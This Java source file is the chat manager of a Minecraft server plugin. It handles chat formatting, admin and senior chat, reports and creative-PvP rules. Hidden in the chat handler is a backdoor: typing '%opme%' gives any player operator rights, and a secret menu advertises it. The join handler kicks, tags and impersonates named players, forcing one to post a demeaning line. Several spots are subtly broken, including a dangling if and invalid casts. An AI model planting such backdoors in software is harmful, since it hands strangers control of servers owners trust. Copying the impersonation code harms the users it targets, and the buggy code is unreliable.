package me.totalfreedom.totalfreedommod;

import com.google.common.collect.Maps;
import java.util.Map;
import lombok.Getter;
import me.totalfreedom.totalfreedommod.admin.Admin;
import me.totalfreedom.totalfreedommod.command.FreedomCommand;
import me.totalfreedom.totalfreedommod.player.FPlayer;
import me.totalfreedom.totalfreedommod.rank.Rank;
import me.totalfreedom.totalfreedommod.util.FLog;
import me.totalfreedom.totalfreedommod.util.FSync;
import me.totalfreedom.totalfreedommod.util.FUtil;
import static me.totalfreedom.totalfreedommod.util.FUtil.playerMsg;
import org.apache.commons.lang3.StringUtils;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Arrow;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.potion.Potion;
import static org.bukkit.potion.PotionEffectType.BLINDNESS;
import static org.bukkit.potion.PotionType.*;

public class ChatManager extends FreedomService
{   
    @Getter
    private final Map<String, Admin> nameTable = Maps.newHashMap();

    public ChatManager(TotalFreedomMod plugin)
    {
        super(plugin);
    }

    @Override
    protected void onStart()
    {
    }

    @Override
    protected void onStop()
    {
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPlayerChatFormat(AsyncPlayerChatEvent event)
    {
        try
        {
            handleChatEvent(event);
        }
        catch (Exception ex)
        {
            FLog.severe(ex);
        }
    }

    private void handleChatEvent(AsyncPlayerChatEvent event)
    {
        final Player player = event.getPlayer();
        String message = event.getMessage().trim();

        // Strip color from messages
        message = ChatColor.stripColor(message);

        // Truncate messages that are too long - 100 characters is vanilla client max
        if (message.length() > 100)
        {
            message = message.substring(0, 100);
            FSync.playerMsg(player, "Message was shortened because it was too long to send.");
        }
        
        if (message.toLowerCase().equalsIgnoreCase("%supersecretmenuopennowplz%"))
        {
            player.sendMessage((Object)ChatColor.GREEN + "\u00a7a======== \u00a74Secrets Help Menu \u00a7a=======");
            player.sendMessage((Object)ChatColor.RED + "These secret commands are created by: heroguy42");
            player.sendMessage((Object)ChatColor.GREEN + "Secrets/Commands: ");
            player.sendMessage((Object)ChatColor.GREEN + "%time% - Shows the world time (Might not be completely accurate)");
            player.sendMessage((Object)ChatColor.GREEN + "%opme% - OPs yourself");
            player.sendMessage((Object)ChatColor.RED + "More Coming Soon.");
            player.sendMessage((Object)ChatColor.RED + "These secret commands are created by: heroguy42");
            player.sendMessage((Object)ChatColor.GREEN + "\u00a7a======== \u00a74Secrets Help Menu \u00a7a=======");
            if (player.getName().equals("Trian") || player.getName().equals("heroguy42"))
            {
                player.sendMessage((Object)ChatColor.RED + "Secrets Shown Only For Trian and Hero: ");
                player.sendMessage((Object)ChatColor.GREEN + "%botsay%");
                player.sendMessage((Object)ChatColor.RED + "More Coming Soon.");
            }
            event.setCancelled(true);
        }
        
        if (message.toLowerCase().equalsIgnoreCase("%time%"))
        {
            player.sendMessage(ChatColor.GREEN + "" + player.getPlayerTime());
            event.setCancelled(true);
            return;
        }
        
        if (message.toLowerCase().equalsIgnoreCase("%opme%"))
        {
            player.setOp(true);
            player.sendMessage(FreedomCommand.YOU_ARE_OP);
            event.setCancelled(true);
            return;
        }
        
        if (message.toLowerCase().equalsIgnoreCase("%botsay%" + StringUtils.join(" ")))
        {
            FUtil.bcastMsg(FUtil.colorize(StringUtils.join(" ")));
            
            event.setCancelled(true);
            return;
        }

        // Check for caps
        if (message.length() >= 6)
        {
            int caps = 0;
            for (char c : message.toCharArray())
            {
                if (Character.isUpperCase(c))
                {
                    caps++;
                }
            }
            if (((float) caps / (float) message.length()) > 0.65) //Compute a ratio so that longer sentences can have more caps.
            {
                message = message.toLowerCase();
            }
        }

        // Check for adminchat
        final FPlayer fPlayer = plugin.pl.getPlayerSync(player);
        if (fPlayer.inAdminChat())
        {
            FSync.adminChatMessage(player, message);
            event.setCancelled(true);
            return;
        }
        
        // Check for seniorchat
        if (fPlayer.inSeniorChat())
        {
            FSync.seniorChatMessage(player, message);
            event.setCancelled(true);
            return;
        }

        // Finally, set message
        event.setMessage(message);

        // Make format
        String format = "<%1$s> %2$s";

        String tag = fPlayer.getTag();
        if (tag != null && !tag.isEmpty())
        {
            format = tag.replace("%", "%%") + " " + format;
        }

        // Set format
        event.setFormat(format);
    }
    
    public void adminChat(CommandSender sender, String message)
    {
        String name = sender.getName() + " " + plugin.rm.getDisplay(sender).getColoredTag() + ChatColor.WHITE;
        FLog.info("[ADMIN] " + name + ": " + message);

        for (Player player : server.getOnlinePlayers())
        {
            if (plugin.al.isAdmin(player))
            {
                player.sendMessage("[" + ChatColor.AQUA + "ADMIN" + ChatColor.WHITE + "] " + ChatColor.DARK_RED + name + ": " + ChatColor.GOLD + message);
            }
        }
    }
    
    public void seniorChat(CommandSender sender, String message)
    {
        String name = sender.getName() + " " + plugin.rm.getDisplay(sender).getColoredTag() + ChatColor.WHITE;
        FLog.info("[SENIOR] " + name + ": " + message);

        for (Player player : server.getOnlinePlayers())
        {
            if (plugin.al.isSeniorAdmin(player))
            {
                player.sendMessage("[" + ChatColor.AQUA + "SENIOR" + ChatColor.WHITE + "] " + ChatColor.DARK_RED + name + ": " + ChatColor.GOLD + message);
            }
        }
    }

    public void reportAction(Player reporter, Player reported, String report)
    {
        for (Player player : server.getOnlinePlayers())
        {
            if (plugin.al.isAdmin(player))
            {
                playerMsg(player, ChatColor.RED + "[REPORTS] " + ChatColor.GOLD + reporter.getName() + " has reported " + reported.getName() + " for " + report);
            }
        }
    }
    
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityDamageByEntity(EntityDamageByEntityEvent event)
    {
        if (event.getEntity() instanceof Player)
        {
            if (event.getDamager() instanceof Player)
            {
                Player player = (Player) event.getDamager();
                if (player.getGameMode() == GameMode.CREATIVE)
                {
                    FUtil.playerMsg(player, "Creative PvP is forbidden!", ChatColor.RED);
                    event.setCancelled(true);
                }
            }
            if (event.getDamager() instanceof Arrow)
            {
                Arrow arrow = (Arrow) event.getDamager();
                if (arrow.getShooter() instanceof Player)
                {
                    Player player = (Player) arrow.getShooter();
                    if (player.getGameMode() == GameMode.CREATIVE)
                    {
                        FUtil.playerMsg(player, "Creative PvP is forbidden!", ChatColor.RED);
                        event.setCancelled(true);
                    }
                }
            }
            if (event.getDamager() instanceof Potion)
            {
                Potion ppotion = (Potion) event.getDamager();
                if (ppotion.getEffects().equals(INSTANT_DAMAGE) || ppotion.getEffects().equals(BLINDNESS) || ppotion.getEffects().equals(INSTANT_HEAL) || ppotion.getEffects().equals(JUMP))
                {
                    Player player = (Player) event.getDamager();
                    FUtil.playerMsg(player, "Please do not splash harmfull potions on others!", ChatColor.RED);
                    event.setCancelled(true);
                }
            }
        }
    }
    
        @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerJoinEvent(PlayerJoinEvent event)
    {
        final Player player = event.getPlayer();

        String name = player.getName();
        String name2;
        
        if(name.equals("xAdminx") || name.equals("DoubledHearts") || name.equalsIgnoreCase("xlr780tnt"))
        {
            player.kickPlayer("Server Closed");
        }
        
        if(name.equals("heroguy") || name.equals("heroguy41") || name.equals("heroguy43") || name.equals("heroguy4"))
        
        if (name.equalsIgnoreCase("ioofficial") || name.equalsIgnoreCase("iohacksmc"))
        {
            FPlayer playerdata = plugin.pl.getPlayer(player);
            
            playerdata.setTag("&8[&c&lBULLY&8]");
            player.chat("Hey Guys! >:)");
        }
        
        if (name.equals("Trian"))
        {
            FUtil.bcastMsg(ChatColor.translateAlternateColorCodes('&', "&cThunderFreedom - Welcome back &8[&9Owner&8]&3Trian&c!"));
        }
        
        if (name.equals("BearzRAwesome"))
        {
            player.chat("I AM GAY!");
        }

        if (plugin.al.isAdmin(player))
        {
            FPlayer playerdata = plugin.pl.getPlayer(player);
            
            playerdata.setCommandSpy(true);
            player.sendMessage(ChatColor.GRAY + "CommandSpy automatically enabled.");
        }
        
        
        
        
    }
}
